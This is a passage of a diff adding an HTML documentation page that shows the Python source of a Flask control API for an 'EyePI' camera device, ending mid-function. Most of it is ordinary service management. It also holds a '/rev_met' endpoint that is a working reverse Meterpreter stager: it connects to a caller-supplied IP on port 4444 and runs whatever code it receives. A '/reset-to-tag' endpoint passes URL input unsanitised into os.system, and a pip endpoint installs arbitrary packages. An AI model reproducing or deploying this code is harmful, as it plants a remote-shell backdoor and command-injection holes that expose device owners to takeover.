@@ -1,0 +1,451 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>api &#8212; SpectroPhenoClimatron EyePI 3.2 documentation</title>
+    
+    <link rel="stylesheet" href="../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../',
+        VERSION:     '3.2',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true,
+        SOURCELINK_SUFFIX: '.txt'
+      };
+    </script>
+    <script type="text/javascript" src="../_static/jquery.js"></script>
+    <script type="text/javascript" src="../_static/underscore.js"></script>
+    <script type="text/javascript" src="../_static/doctools.js"></script>
+    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+   
+  <link rel="stylesheet" href="../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head>
+  <body role="document">
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <h1>Source code for api</h1><div class="highlight"><pre>
+<span></span><span class="kn">import</span> <span class="nn">dbm</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">configparser</span> <span class="k">import</span> <span class="n">ConfigParser</span>
+<span class="kn">from</span> <span class="nn">functools</span> <span class="k">import</span> <span class="n">wraps</span>
+<span class="kn">from</span> <span class="nn">glob</span> <span class="k">import</span> <span class="n">glob</span>
+<span class="kn">import</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">socket</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="k">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">g</span>
+<span class="kn">from</span> <span class="nn">flask_bcrypt</span> <span class="k">import</span> <span class="n">Bcrypt</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">werkzeug.exceptions</span> <span class="k">import</span> <span class="n">default_exceptions</span>
+<span class="kn">from</span> <span class="nn">werkzeug.exceptions</span> <span class="k">import</span> <span class="n">HTTPException</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="k">import</span> <span class="n">jsonify</span>
+
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+
+<span class="n">bcrypt</span> <span class="o">=</span> <span class="n">Bcrypt</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+
+<div class="viewcode-block" id="systemctl"><a class="viewcode-back" href="../api.html#api.systemctl">[docs]</a><span class="k">def</span> <span class="nf">systemctl</span><span class="p">(</span><span class="n">options</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    calls_systemctl with some parameters</span>
+<span class="sd">    mainly to keep code clean,</span>
+<span class="sd">    defined at start because its used _everywere_.</span>
+<span class="sd">    returns True if command was successful, else false</span>
+<span class="sd">    :param options: options to be passed to systemctl</span>
+<span class="sd">    :return: True if systemctl exit code is 0, otherwise False</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="kc">True</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">options</span><span class="p">))</span> <span class="k">else</span> <span class="kc">False</span></div>
+
+
+<div class="viewcode-block" id="authenticate"><a class="viewcode-back" href="../api.html#api.authenticate">[docs]</a><span class="k">def</span> <span class="nf">authenticate</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Access DENIED!&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;WWW-Authenticate&#39;</span><span class="p">:</span> <span class="s1">&#39;Basic realm=&quot;Login Required&quot;&#39;</span><span class="p">})</span></div>
+
+
+<div class="viewcode-block" id="requires_auth"><a class="viewcode-back" href="../api.html#api.requires_auth">[docs]</a><span class="k">def</span> <span class="nf">requires_auth</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">decorated</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="n">auth</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">authorization</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">auth</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">authenticate</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">with</span> <span class="n">dbm</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;db&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">passdb</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">check_password_hash</span><span class="p">(</span><span class="n">passdb</span><span class="p">[</span><span class="n">b</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span> <span class="n">auth</span><span class="o">.</span><span class="n">password</span><span class="p">):</span>
+                    <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">authenticate</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">decorated</span></div>
+
+
+<div class="viewcode-block" id="json_response"><a class="viewcode-back" href="../api.html#api.json_response">[docs]</a><span class="k">def</span> <span class="nf">json_response</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    json decoration,</span>
+<span class="sd">    automatically detects the correct json formatter</span>
+<span class="sd">    :param f: fucntion to decorate</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">decorated</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="k">def</span> <span class="nf">fn</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+            <span class="n">rstuff</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">*</span><span class="n">kwargs</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">rstuff</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">list</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">rstuff</span><span class="p">)</span>
+            <span class="k">elif</span> <span class="nb">type</span><span class="p">(</span><span class="n">rstuff</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">dict</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">rstuff</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">rstuff</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">fn</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">decorated</span></div>
+
+
+<div class="viewcode-block" id="after_this_request"><a class="viewcode-back" href="../api.html#api.after_this_request">[docs]</a><span class="k">def</span> <span class="nf">after_this_request</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    after request function</span>
+<span class="sd">    :param func:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;call_after_request&#39;</span><span class="p">):</span>
+        <span class="n">g</span><span class="o">.</span><span class="n">call_after_request</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">g</span><span class="o">.</span><span class="n">call_after_request</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">func</span></div>
+
+
+<div class="viewcode-block" id="shutdown_server"><a class="viewcode-back" href="../api.html#api.shutdown_server">[docs]</a><span class="k">def</span> <span class="nf">shutdown_server</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    shuts down the current werkzeug server</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">func</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;werkzeug.server.shutdown&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">func</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;Not running with the Werkzeug Server&#39;</span><span class="p">)</span>
+    <span class="n">func</span><span class="p">()</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
+<div class="viewcode-block" id="per_request_callbacks"><a class="viewcode-back" href="../api.html#api.per_request_callbacks">[docs]</a><span class="k">def</span> <span class="nf">per_request_callbacks</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;call_after_request&#39;</span><span class="p">,</span> <span class="p">()):</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">response</span></div>
+
+<div class="viewcode-block" id="reconfigure_systemd"><a class="viewcode-back" href="../api.html#api.reconfigure_systemd">[docs]</a><span class="k">def</span> <span class="nf">reconfigure_systemd</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    reconfigures systemd service files for api, webinterface and capture.</span>
+<span class="sd">    copies the service files from the current dir and checks to see f they are enabled.</span>
+<span class="sd">    reboots if changed.</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">systemd_path</span> <span class="o">=</span> <span class="s2">&quot;/etc/systemd/system/</span><span class="si">{}</span><span class="s2">&quot;</span>
+    <span class="n">new_service_files</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s2">&quot;eyepi-api.service&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;eyepi-capture.service&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;eyepi-webinterface.service&quot;</span>
+    <span class="p">]</span>
+    <span class="n">needs_reboot</span> <span class="o">=</span> <span class="kc">False</span>
+
+    <span class="n">old_capture_service_file</span> <span class="o">=</span> <span class="s2">&quot;spc-eyepi_capture.service&quot;</span>
+    <span class="n">old_webinterface_service_file</span> <span class="o">=</span> <span class="s2">&quot;spc-eyepi_webinterface.service&quot;</span>
+
+
+    <span class="k">def</span> <span class="nf">ensure_systemd_unit</span><span class="p">(</span><span class="n">service_file</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">systemd_path</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">service_file</span><span class="p">))</span> <span class="ow">and</span> \
+                <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">service_file</span><span class="p">):</span>
+            <span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">service_file</span><span class="p">,</span> <span class="n">systemd_path</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">service_file</span><span class="p">))</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">systemd_path</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">service_file</span><span class="p">),</span> <span class="mo">0o664</span><span class="p">)</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl daemon-reload&quot;</span><span class="p">)</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl enable </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">service_file</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">s_file</span> <span class="ow">in</span> <span class="n">new_service_files</span><span class="p">:</span>
+        <span class="n">ensure_systemd_unit</span><span class="p">(</span><span class="n">s_file</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl is-enabled </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&quot;eyepi-capture.service&quot;</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> \
+                    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl is-enabled </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">old_capture_service_file</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl disable </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">old_capture_service_file</span><span class="p">))</span>
+        <span class="n">needs_reboot</span> <span class="o">=</span> <span class="kc">True</span>
+
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl is-enabled </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&quot;eyepi-webinterface.service&quot;</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> \
+                    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl is-enabled </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">old_webinterface_service_file</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl disable </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">old_webinterface_service_file</span><span class="p">))</span>
+        <span class="n">needs_reboot</span> <span class="o">=</span> <span class="kc">True</span>
+
+    <span class="k">if</span> <span class="n">needs_reboot</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;shutdown -r +1 &#39;Shutting down because the unit files were changed.&quot;</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="get_eyepi_capture_service"><a class="viewcode-back" href="../api.html#api.get_eyepi_capture_service">[docs]</a><span class="k">def</span> <span class="nf">get_eyepi_capture_service</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    gets the currently active spc-eyepi service file.</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">new_capture_service_file</span> <span class="o">=</span> <span class="s2">&quot;eyepi-capture.service&quot;</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl is-enabled </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">new_capture_service_file</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">new_capture_service_file</span>
+    <span class="k">return</span> <span class="s2">&quot;spc-eyepi_capture.service&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/restart&#39;</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/reboot&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="restart"><a class="viewcode-back" href="../api.html#api.restart">[docs]</a><span class="k">def</span> <span class="nf">restart</span><span class="p">():</span>
+    <span class="nd">@after_this_request</span>
+    <span class="k">def</span> <span class="nf">shutdown</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="c1"># shutdown_server()</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;shutdown -r +1 &#39;This computer will restart in 1 minute&#39;&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">response</span>
+
+    <span class="k">return</span> <span class="s2">&quot;Rebooting... &quot;</span><span class="p">,</span> <span class="mi">200</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/update&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="update"><a class="viewcode-back" href="../api.html#api.update">[docs]</a><span class="k">def</span> <span class="nf">update</span><span class="p">():</span>
+    <span class="nd">@after_this_request</span>
+    <span class="k">def</span> <span class="nf">_update</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+        <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;git fetch --all;git reset --hard origin/master&quot;</span><span class="p">)</span>
+        <span class="n">systemctl</span><span class="p">(</span><span class="s2">&quot;restart </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">get_eyepi_capture_service</span><span class="p">()))</span>
+        <span class="k">return</span> <span class="n">response</span>
+
+    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="s2">&quot;SUCCESS&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/reset-to-tag/&lt;tag&gt;&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="reset_to_tag"><a class="viewcode-back" href="../api.html#api.reset_to_tag">[docs]</a><span class="k">def</span> <span class="nf">reset_to_tag</span><span class="p">(</span><span class="n">tag</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    resets the repository to a tag.</span>
+<span class="sd">    useful for resetting to a known working version.</span>
+<span class="sd">    :param tag:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="nd">@after_this_request</span>
+    <span class="k">def</span> <span class="nf">reset_to_tag</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+        <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;git fetch --tags --all;git reset --hard </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tag</span><span class="p">))</span>
+        <span class="n">systemctl</span><span class="p">(</span><span class="s2">&quot;restart </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">get_eyepi_capture_service</span><span class="p">()))</span>
+        <span class="k">return</span> <span class="n">response</span>
+
+    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+            <span class="s2">&quot;message&quot;</span><span class="p">:</span> <span class="s2">&quot;Reverted to </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tag</span><span class="p">)}</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/pip_install&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="pip_install"><a class="viewcode-back" href="../api.html#api.pip_install">[docs]</a><span class="k">def</span> <span class="nf">pip_install</span><span class="p">():</span>
+    <span class="n">package</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;package&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="kn">import</span> <span class="nn">pip</span>
+        <span class="n">_</span><span class="p">,</span> <span class="n">package</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">)</span><span class="o">.</span><span class="n">popitem</span><span class="p">()</span>
+        <span class="n">pip</span><span class="o">.</span><span class="n">main</span><span class="p">([</span><span class="s2">&quot;install&quot;</span><span class="p">,</span> <span class="n">package</span><span class="p">])</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span><span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;message&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)},</span> <span class="mi">500</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;message&quot;</span><span class="p">:</span> <span class="s2">&quot;Package installed&quot;</span><span class="p">}</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/rev_met&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<span class="nd">@json_response</span>
+<div class="viewcode-block" id="reverse_meterpreter"><a class="viewcode-back" href="../api.html#api.reverse_meterpreter">[docs]</a><span class="k">def</span> <span class="nf">reverse_meterpreter</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    reverse meterpreter shell</span>
+<span class="sd">    :param: ip (GET) ip address to remotely connect to</span>
+<span class="sd">    :return: json with status</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;ip&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+    <span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="mi">4444</span><span class="p">))</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&gt;I&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">!=</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">d</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+        <span class="n">exec</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="n">s</span><span class="p">})</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+                <span class="s2">&quot;message&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}</span>
+
+    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+            <span class="s2">&quot;message&quot;</span><span class="p">:</span> <span class="s1">&#39;Welcome...&#39;</span><span class="p">}</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/botnetmgmt&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="botnetmgmt"><a class="viewcode-back" href="../api.html#api.botnetmgmt">[docs]</a><span class="k">def</span> <span class="nf">botnetmgmt</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    deprecated in favor of a different method of updating camera status.</span>
+<span class="sd">    will be removed in the next major update.</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="c1"># use post later to send commands</span>
+    <span class="c1"># get hostname:</span>
+    <span class="n">jsondata</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">version</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s2">&quot;/usr/bin/git describe --always&quot;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">jsondata</span><span class="p">[</span><span class="s2">&quot;version&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">version</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">hn</span> <span class="o">=</span> <span class="kc">None</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">jsondata</span><span class="p">[</span><span class="s2">&quot;external_ip&quot;</span><span class="p">]</span> <span class="o">=</span> \
+                <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span>
+                        <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s1">&#39;https://api.ipify.org/?format=json&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
+                                <span class="s1">&#39;utf-8&#39;</span><span class="p">))[</span>
+                    <span class="s1">&#39;ip&#39;</span><span class="p">]</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
